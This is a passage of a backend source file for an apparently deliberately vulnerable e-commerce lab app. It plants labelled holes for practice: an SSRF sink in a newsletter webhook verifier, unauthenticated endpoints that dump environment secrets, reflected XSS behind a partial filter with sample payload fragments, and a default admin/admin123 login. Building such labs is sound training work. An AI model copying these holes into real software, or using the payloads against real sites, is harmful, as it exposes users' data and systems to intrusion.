// (169.254.169.254) or other internal hosts not otherwise reachable from
// the internet. A "verify webhook" utility on an unrelated newsletter
// feature is a deliberately less-obvious SSRF sink than an "import photo
// from URL" tool -- most testers look for SSRF near image/file-fetching
// features first.
// ----------------------------------------------------------------------------
app.post("/api/newsletter/verify-unsubscribe-webhook", requireAdmin, (req, res) => {
  const webhookUrl = req.body.webhook_url || "";
  let target;
  try {
    target = new URL(webhookUrl);
  } catch (e) {
    return res.status(400).json({ error: "Invalid URL" });
  }
  const client = target.protocol === "https:" ? https : http;
  const request = client.get(target, (r) => {
    let body = "";
    r.on("data", (chunk) => {
      if (body.length < 2000) body += chunk.toString();
    });
    r.on("end", () => {
      res.json({
        url: webhookUrl,
        status_code: r.statusCode,
        content_type: r.headers["content-type"] || "",
        body_snippet: body.slice(0, 2000),
      });
    });
  });
  request.on("error", (err) => {
    res.status(500).json({ error: err.message });
  });
  request.setTimeout(5000, () => {
    request.destroy();
    res.status(504).json({ error: "Request timed out" });
  });
});

// Kept for frontend/route compatibility with the old admin "import image"
// tool name, but this variant is now a thin, safe wrapper: it fetches
// only from the app's own trusted image host, never from an
// attacker-supplied URL. Not an SSRF sink -- see the webhook-verification
// endpoint above for the relocated vulnerability.
app.post("/api/admin/fetch-image-preview", requireAdmin, (req, res) => {
  res.status(410).json({
    error:
      "This tool has moved. Use the newsletter webhook verifier for outbound URL checks (admin > Newsletter Webhook).",
  });
});

app.post("/api/admin/products", requireAdmin, async (req, res, next) => {
  try {
    const { name, category_id, price, sizes_available, material, description, image } = req.body;
    const slug = (name || "").toLowerCase().replace(/\s+/g, "-");
    await pool.query(
      `INSERT INTO products (name, slug, category_id, price, sizes_available, material, description, image)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
      [name, slug, category_id, price, sizes_available, material, description, image || "running-shoe-1.jpg"]
    );
    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

// ----------------------------------------------------------------------------
// VULNERABILITY #7 (endpoint) - CWE-526 Env Var Exposure (OWASP A01:2025)
// Endpoint: GET /api/debug/env
//
// Intended as an internal diagnostics page, this endpoint has no
// authentication check at all and dumps the full process environment,
// including the fake Stripe secret key, DB admin password, SMTP password
// and the admin login backdoor value defined above.
// ----------------------------------------------------------------------------
app.get("/api/debug/env", (req, res) => {
  // VULNERABLE: no auth check, dumps full environment to any visitor
  res.json({ env: process.env });
});

app.get("/api/admin/system-info", (req, res) => {
  // Companion "system info" panel -- also unauthenticated, reinforcing #7.
  res.json({
    node_version: process.version,
    platform: process.platform,
    cwd: process.cwd(),
    session_secret: SESSION_SECRET,
    env: process.env,
  });
});

// ============================================================================
// NEWSLETTER
// ============================================================================

// ----------------------------------------------------------------------------
// VULNERABILITY #13 - CWE-80 Reflected XSS (OWASP A05:2025 Injection)
// Endpoint: POST /api/newsletter/subscribe (the `email` field, reflected
// back in the confirmation message)
//
// The submitted email address is run through the same deliberately-
// partial partialXssFilter() (blocks <script> tags and the literal
// alert( call only) and echoed straight back in the JSON response as
// `confirmation_message`; the React Footer component renders that field
// with dangerouslySetInnerHTML to show a personalized "You're subscribed,
// <email>!" confirmation. Any payload placed in the email field that
// survives the partial filter (e.g. <img src=x onerror=...> or
// <svg onload=...>) executes in the victim's browser as soon as the
// confirmation renders -- no click-through link required, since this
// fires immediately on form submit. A newsletter signup field is a
// deliberately less-obvious reflected-XSS injection point than a visible
// search box -- most testers assume an email input is validated as an
// email and skip fuzzing it for markup.
// ----------------------------------------------------------------------------
app.post("/api/newsletter/subscribe", async (req, res, next) => {
  try {
    const email = req.body.email || "";
    const filteredEmail = partialXssFilter(email); // VULNERABLE: partial filter only, reflected below
    await pool.query("INSERT INTO newsletter_subscribers (email) VALUES (?)", [email]);
    res.json({
      success: true,
      confirmation_message: `You're subscribed, ${filteredEmail}! Watch your inbox for new drops.`,
    });
  } catch (err) {
    next(err);
  }
});

// ============================================================================
// DEMO: trigger the global exception handler (for lab verification of #25)
// ============================================================================
app.get("/api/trigger-error", (req, res) => {
  throw new Error(`Demo unhandled exception triggered by ${req.ip} for lab verification`);
});

// --------------------------------------------------------------------------
// Error handler must be registered LAST
// --------------------------------------------------------------------------
app.use(errorHandler);

app.listen(PORT, "0.0.0.0", () => {
  console.log(`StrideStyle backend listening on http://0.0.0.0:${PORT}`);
  console.log("Default admin login: admin / admin123");
});
